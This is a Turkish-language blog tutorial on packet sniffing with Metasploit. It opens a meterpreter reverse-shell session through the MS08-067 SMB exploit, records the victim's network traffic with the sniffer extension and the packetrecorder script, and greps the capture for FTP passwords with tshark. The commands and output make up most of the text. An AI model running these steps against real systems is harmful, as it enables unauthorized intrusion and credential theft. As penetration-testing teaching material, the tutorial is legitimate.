---
draft: false

title:  'MSF Paket Dinleme'
date: '2017-06-05T13:32:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  "Metasploit Framework kullanarak bir hedef bilgisayarda meterpreter shell açtığınızda, bağlandığınız bilgisayarın ağda yaptığı haberleşme esnasında gönderilen ve alınan bilgileri görmek isteyebilirsiniz. Bu işleme\_paket dinleme\_adı verilmektedir." 
 
url:  /tr/msf-paket-dinleme/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---
## Paket Dinleme

Metasploit Framework kullanarak bir hedef bilgisayarda meterpreter shell açtığınızda, bağlandığınız bilgisayarın ağda yaptığı haberleşme esnasında gönderilen ve alınan bilgileri görmek isteyebilirsiniz. Bu işleme **paket dinleme** adı verilmektedir.

Meterpreter, `sniffer` modülü ile bu trafiği kaydedebilirsiniz. Toplamda 200.000 pakete kadar kayıt yapabilen `sniffer` modülü, paketleri PCAP formatında kaydeder. Böylece PCAP dosyasını `psnuffle, dsniff veya wireshark` programlarıyla analiz edebilirsiniz.

Meterpreter `sniffer` eklentisi MicroOLAP Packet Sniffer SDK kullanır. Paketleri dinlemek için diskin herhangi bir yerinden veri alıp verme işlemi yapmaz. Ayrıca, meterpreter tarafından oluşturulan paketler kayıt dışı tutarak karışıklığın önüne de geçer. Meterpreter tarafından yakalanan veriler, bilgisayarımıza SSL/TLS kullanılarak şifreli olarak aktarılır.

## Meterpreter Oturum Açalım

Öncelikle keşfettiğiniz bir servis veya zafiyeti kullanarak meterpreter oturumu açmalısınız. Aşağıda örneğini görebilirsiniz.
```bash
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 10.211.55.126
msf exploit(ms08_067_netapi) > set RHOST 10.10.1.119
msf exploit(ms08_067_netapi) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Triggering the vulnerability...
> Transmitting intermediate stager for **over-sized stage...(216 bytes)
> Sending stage (205824 bytes)
> Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)
```

## Sinffer Modülünü Yükleyelim

Meterpreter oturumu açıldığında `use sniffer` komutuyla eklentiyi aktif hale getirmeliyiz. Ardında `help` komutunu verdiğinizde, yardım listesinde `sniffer` ile ilgili kullanılabilir durumda olan komutları görebilirsiniz.
```bash
meterpreter > use sniffer
Loading extension sniffer...success.

meterpreter > help

Sniffer Commands
**================**

     Command             Description
     -------             -----------
     sniffer_dump        Retrieve captured packet data
     sniffer_interfaces  List all remote sniffable interfaces
     sniffer_start       Capture packets on a previously opened interface
     sniffer_stats       View statistics of an active capture
     sniffer_stop        Stop packet captures on the specified interface
```

## Dinlenebilir Arayüzler

Hedef sistemde hangi ağ arayüzlerinin aktif olduğunu görmek için `sniffer_interfaces` komutunu kullanarak listeyi inceliyoruz.
```bash
meterpreter > sniffer_interfaces

1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
```

## Dinlemeye Başlama

Bizim örneğimizde 1 adet arayüz bulunmaktadır. Bu ağ cihazını dinlemek için `sniffer_start 1` komutunu veriyoruz. Bilgiler `/tmp/all.cap` dosyasına kayıt edilecektir.
```bash
meterpreter > sniffer_start 1
> Capture started on interface 1 (200000 packet buffer)
```

## Kayıtları Kontrol Etme

Dinleme işlemi devam ederken, ne kadar paketin kayıt edildiğini görmek için `sniffer_dump` komutunu kullanarak kaç adet paketin dosyaya yazıldığını görebilirsiniz.
```bash
meterpreter > sniffer_dump 1 /tmp/all.cap
> Dumping packets from interface 1...
> Wrote 19 packets to PCAP file /tmp/all.cap

meterpreter > sniffer_dump 1 /tmp/all.cap
> Dumping packets from interface 1...
> Wrote 199 packets to PCAP file /tmp/all.cap
```

## packetrecorder Eklentisi

Meterpreter `sniffer` eklentisinin yanında paket dinleme için geliştirilen `packetrecorder` script kodlarını da kullanabilirsiniz. Bu modül, paket kayıtlarını belirli zaman aralıklarına bölmenizi sağlar. Örneğin 30 Saniye aralıklarla kayıt yapmak isteyebilirsiniz.

<h3 class="wp-block-heading" id="packetrecorder-aktif-hale-getirelim">packetrecorder Aktif Hale Getirelim
```bash
meterpreter > run packetrecorder 
Meterpreter Script for **capturing packets **in **to a PCAP file
on a target host given a interface ID.

OPTIONS:

    -h        Help menu.
    -i   Interface ID number where all packet capture will be **done**.
    -l   Specify and alternate folder to save PCAP file.
    -li        List interfaces that can be used for **capture.
    -t   Time interval **in **seconds between recollection of packet, default 30 seconds.
```

Dinlemeye başlamadan önce, dinlenebilir arayüzlerin listesini kontrol edelim.
```bash
meterpreter > run packetrecorder -li

1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
```

Bu örneğimizde 3 adet ağ cihazı olduğunu görüyoruz. `-i 2` seçeneği ile 2 numaralı arayüzü dinleyeceğimizi belirtmiş oluyoruz. `-l /root/` seçeneği ile PCAP dosyasının nereye kayıt edileceğini belirliyoruz. Dinleme başladığından bir süre sonra işlemi bitirmek için `CTRL+C` tuşlarını kullanabilirsiniz.
```bash
meterpreter > run packetrecorder -i 2 -l /root/
> Starting Packet capture on interface 2
[+] Packet capture started
> Packets being saved **in **to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
> Packet capture interval is 30 Seconds
^C
> Interrupt 
[+] Stopping Packet sniffer...
meterpreter >
```

Kayıt edilen PCAP dosyasını `wireshark` veya `tshark` programıyla analiz edebilirsiniz. Aşağıda `tshark` komutuna ait bir örnek bulunmaktadır. Örnek komutta, paketlerin içinde geçen `PASS` ifadesinin bulunduğu paketler aranmaktadır.
```bash
root@kali:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS
Running as user "root" and group "root". This could be dangerous.
2489  82.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
2685  96.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t```
